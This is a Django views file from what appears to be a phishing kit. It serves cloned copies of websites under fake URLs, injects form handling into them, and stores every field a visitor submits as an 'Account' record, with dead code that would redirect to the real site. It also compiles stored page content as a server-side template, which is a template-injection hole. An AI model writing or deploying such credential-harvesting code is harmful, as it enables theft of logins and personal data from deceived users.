from django.shortcuts import render, redirect, HttpResponse
from django.http import JsonResponse
from django.urls import reverse
from django.template import RequestContext, Template

from custom_admin.models import TemplateCopy, Account
from custom_admin.utils import form_injection


import re

# Create your views here.
def home(request):
    return HttpResponse('app home')

def renderizator(request, url):
    """
    Responsável por renderizar o site em uma url dinamica
    """
    if request.method == 'POST':
        data = dict(request.POST)
        template = TemplateCopy.objects.get(url_fake=url)
        acc = Account.objects.create(template=template, datas=data)
        acc.save()
        return JsonResponse(data) 


        return redirect(template.url_clonar)
    
    else:
        try:
            template = TemplateCopy.objects.get(url_fake=url)
            content = form_injection(template.content, url=url)

            template = Template(content)
            context = RequestContext(request, {'URL': url})
            rendered_html = template.render(context)
            
            return HttpResponse(rendered_html)


        except (TemplateCopy.DoesNotExist):
            return redirect(reverse('home:home'))





